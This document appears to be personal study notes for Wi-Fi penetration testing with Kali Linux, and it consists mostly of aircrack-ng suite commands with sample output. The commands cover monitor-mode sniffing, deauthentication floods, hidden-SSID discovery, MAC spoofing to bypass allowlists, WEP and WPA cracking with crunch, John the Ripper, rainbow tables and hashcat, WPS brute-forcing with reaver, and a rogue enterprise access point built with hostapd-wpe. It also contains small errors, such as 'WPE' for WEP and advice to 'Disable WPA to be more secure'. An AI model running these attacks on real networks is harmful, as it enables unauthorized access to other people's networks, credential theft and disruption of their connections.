
Wifi Types
---------
WPE, WPA, WPA2
Enterprise WPA

"Disable WPA to be more secure"

External Wifi Adapter - ATHEROS

"Connect wifi adapter"

"It can change mac address of wifi adapter. See more in youtube."

ATHEROS Wifi Adapter - connect - Your Machine (OS) - connect - Your Virtual Machine (Guest OS/Kali)

"Type the following command in Kali"

> ifconfig

eth0: ...

lo: ...

wlan0: ...

> iwconfig

eth0: ...

lo: ...

wlan0: ...
	Mode: Managed ...

> ifconfig wlan0 down
> airmon-ng check kill

"Above command kill network manager in Kali"

"Below command change network mode"

> iwconfig wlan0 mode monitor
> ifconfig wlan0 up
> iwconfig

eth0: ...

lo: ...

wlan0: ...
	Mode: Monitor ...

Sniffing using airodump-ng
--------------------------

> iwconfig

eth0: ...

lo: ...

mon0: ...
	Mode: Monitor ...

"When you run below command, you will see wifi around you."

> airodump-ng mon0

CH 13 ] [ Elapsed: 0 s ] [ 2018-10-08 09:58

BSSID 				PWR		Beacons		#DATA,		#/s 	CH 		MB 		ENC 	CIPHER 		AUTH 		ESSID

1m:4c:w3:5g:9c:a5	-38		38 			0 			0 		1 		54e 	WEP 	WEP 					one_name
1n:4y:3e:g4:q2:6y	-50		20 			6 			0 		6 		270 	WPA 	CCMP 		PSK			a_name
1n:4y:3e:g4:q2:6y	-53		21 			0 			0 		3 		130 	WPA2 	CCMP 		MGT			random_name

"Below are descriptions"

ENC - Encryption Name
ESSID - Wifi Name
BSSID - Mac Address
CH - Channel ID
#DATA - The number of transferring packets/IVs

"Wifi Bands"
"Scanning 5GHz"

> airodump-ng --band a mon0

CH 13 ] [ Elapsed: 0 s ] [ 2018-10-08 09:58

BSSID 				PWR		Beacons		#DATA,		#/s 	CH 		MB 		ENC 	CIPHER 		AUTH 		ESSID

1m:4c:w3:5g:9c:a5	-38		38 			0 			0 		1 		54e 	WEP 	WEP 					one_name
1n:4y:3e:g4:q2:6y	-50		20 			6 			0 		6 		270 	WPA 	CCMP 		PSK			a_name
1n:4y:3e:g4:q2:6y	-53		21 			0 			0 		3 		130 	WPA2 	CCMP 		MGT			random_name

"Scanning 2.4GHz & 5GHz"

> airodump-ng --band abg mon0

CH 13 ] [ Elapsed: 0 s ] [ 2018-10-08 09:58

BSSID 				PWR		Beacons		#DATA,		#/s 	CH 		MB 		ENC 	CIPHER 		AUTH 		ESSID

1m:4c:w3:5g:9c:a5	-38		38 			0 			0 		1 		54e 	WEP 	WEP 					one_name
1n:4y:3e:g4:q2:6y	-50		20 			6 			0 		6 		270 	WPA 	CCMP 		PSK			a_name
1n:4y:3e:g4:q2:6y	-53		21 			0 			0 		3 		130 	WPA2 	CCMP 		MGT			random_name

Targeted Sniffing using airodump-ng
----------------------------------

"After typing below command, you will see connected devices in targeted network."

> airodump-ng --bssid [target_network_mac_address] --channel [channel_id] --write [output_file] mon0

CH 13 ] [ Elapsed: 0 s ] [ 2018-10-08 09:58

BSSID 				PWR		Beacons		#DATA,		#/s 	CH 		MB 		ENC 	CIPHER 		AUTH 		ESSID

1n:4y:3e:g4:q2:6z	-53		21 			0 			0 		3 		130 	OPN 		 					<length: 0>

BSSID				STATION				PWR		Rate		Lost 	Frames 		Probe

1n:4y:3e:g4:q2:6z	a2:4y:3e:g4:q2:6w	-33		0 			0 		680

"After typing above command, enter Ctrl+C, then enter ls"

> ls -l

Desktop Downloads Pictures ...
[output_file].cap [output_file]csv [output_file].kismet.csv [output_file].kismet.netxml

"It can open [output_file].cap in Wireshark program."

De-Auth Attack by aireplay-ng
----------------------------

> aireplay-ng --deauth 10000000 -a [targeted_network_mac_address] -c [targeted_network_client_mac_address] mon0

Finding Hidden Network Name
--------------------------

"Hidden network is show as <length: 0>"

> airodump-ng mon0

CH 13 ] [ Elapsed: 0 s ] [ 2018-10-08 09:58

BSSID 				PWR		Beacons		#DATA,		#/s 	CH 		MB 		ENC 	CIPHER 		AUTH 		ESSID

1m:4c:w3:5g:9c:a5	-38		38 			0 			0 		1 		54e 	WEP 	WEP 					one_name
1n:4y:3e:g4:q2:6y	-50		20 			6 			0 		6 		270 	WPA 	CCMP 		PSK			a_name
1n:4y:3e:g4:q2:6y	-53		21 			0 			0 		3 		130 	WPA2 	CCMP 		MGT			random_name
1n:4y:3e:g4:q2:6z	-53		21 			0 			0 		3 		130 	OPN 		 					<length: 0>

> airodump-ng --bssid [targeted_network_mac_address] --channel [channel_id] mon0

CH 13 ] [ Elapsed: 0 s ] [ 2018-10-08 09:58

BSSID 				PWR		Beacons		#DATA,		#/s 	CH 		MB 		ENC 	CIPHER 		AUTH 		ESSID

1n:4y:3e:g4:q2:6z	-53		21 			0 			0 		3 		130 	OPN 		 					<length: 0>

BSSID				STATION				PWR		Rate		Lost 	Frames 		Probe

1n:4y:3e:g4:q2:6z	a2:4y:3e:g4:q2:6w	-33		0 			0 		680 		

> aireplay-ng --deauth 4 -a [targeted_network_mac_address] -c [targeted_network_client_mac_address] mon0

"After typing above command you will see ESSID or network name in info that got from below command"
> airodump-ng --bssid [targeted_network_mac_address] --channel [channel_id] mon0

CH 13 ] [ Elapsed: 0 s ] [ 2018-10-08 09:58

BSSID 				PWR		Beacons		#DATA,		#/s 	CH 		MB 		ENC 	CIPHER 		AUTH 		ESSID

1n:4y:3e:g4:q2:6z	-53		21 			0 			0 		3 		130 	OPN 		 					ghost_name

BSSID				STATION				PWR		Rate		Lost 	Frames 		Probe

1n:4y:3e:g4:q2:6z	a2:4y:3e:g4:q2:6w	-33		0 			0 		680

Bypassing Whitelist, Blacklist Mac Address by Mac Address changing
-----------------------------------------------------------------

> ifconfig
> ifconfig wlan0 down
> macchanger -m [temp_mac_address] wlan0

WEP Cracking
------------

1) Capture a large number of packets/IVs (airodump-ng)
2) Analyse captured IVs/packets and crack the key (aircrack-ng)

> airodump-ng --bssid [target_network_mac_address] --channel [channel_id] --write [output_file] mon0

"After typing above command, enter Ctrl+C, then enter ls"

> ls -l

Desktop Downloads Pictures ...
[output_file].cap [output_file]csv [output_file].kismet.csv [output_file].kismet.netxml

> aircrack-ng [output_file].cap

Problem - If network is not busy and not get enough packets/IVs to crack
Solution - Force network to generate new IVs/packets by associating by using Fake Auth Attack and ARP Replay (aireplay-ng)

> airodump-ng --bssid [target_network_mac_address] --channel [channel_id] --write [output_file] mon0

"Seperate Terminal"

"After typing above command, enter Ctrl+C, then enter ls"

> aireplay-ng --fakeauth 0 -a [target_network_mac_address] -h [temp_mac_address] mon0
> aireplay-ng --arpreplay -b [target_network_mac_address] -h [temp_mac_address] mon0

> ls -l

Desktop Downloads Pictures ...
[output_file].cap [output_file]csv [output_file].kismet.csv [output_file].kismet.netxml

> aircrack-ng [output_file].cap

"There has also other attacks for WEP such as chopchop, fragmentation."

WPA Cracking
------------

1) Capture Hand Shake (aireplay-ng)
2) Create Word List

"After typing below command, you will see connected devices in targeted network."

> airodump-ng --bssid [target_network_mac_address] --channel [channel_id] --write [output_file] mon0

> aireplay-ng --deauth 4 -a [target_network_mac_address] -c [target_network_client_mac_address] mon0

"After typing above command it will get hand shake in above it command."

"Lets create word list"

> crunch [min] [max] [characters] -t [pattern] -o [word_list_file]

e.g - crunch 6 8 [abc123] -t a@@@@b

aaaaab
aabbbb
abaaab
.
.
.

> aircrack-ng [output_file].cap -w [word_list_file]

John The Ripper

"Saving Progress by using John The Ripper"

> john --wordlist=[word_list_file] --stdout

> john --wordlist=[word_list_file] --stdout --session=[session_name] | aircrack-ng -w - -b [temp_mac_address] [output_file].cap

> john --restore=[session_name] | aircrack-ng -w - -b [temp_mac_address] [output_file].cap

"Making not to waste storage for huge word list"

> crunch 8 8 -o [word_list_file]

> crunch 8 8 

> crunch 8 8 | aircrack-ng -b [temp_mac_address] -w - [output_file].cap

> crunch 8 8 | john --stdin --session=[session_name] --stdout | aircrack-ng -b [temp_mac_address] -w - [output_file].cap

> crunch 8 8 | john --restore=[session_name] | aircrack-ng -b [temp_mac_address] -w - [output_file].cap

Rainbow Table

"Speed up cracking process"

> airolib-ng [db_name] --import passwd [word_list_file]
> echo "target_network_name" > [target_essid_file]
> airolib-ng [db_name] --import essid [target_essid_file]
> airolib-ng [db_name] --batch

> aircrack-ng -r [db_name] [output_file].cap

CPU VS GPU

"Using GPU for cracking (e.g - hashcat)"

> hashcat64.exe -m 2500 -d 1 [output_file].hccapx [word_list_file].txt

WPA Explotation
---------------

"Lets explore WPS enabled network"

> wash --interface mon0

> aireplay-ng --fakeauth 30 -a [target_network_mac_address] -h [temp_mac_address] mon0

> reaver --bssid [target_network_mac_address] --channel [channel_id] --interface mon0 -vvv --no-associate

"Lets unlock WPS"

> mdk3 mon0 a -a [target_network_mac_address] -m

Enterprise WPA Cracking
---------------------

"By using Fake Enterprise WPA Access Point"

> apt-get update
> apt-get install hostapd-wpe
> leafpad /etc/hostapd-wpe/hostapd-wpe.conf

"Modify hostapd-wpe.conf file as necessary."

> service network-manager stop
> hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf

> asleap -C [challenge] -R [response] -W [word_list_file]
















































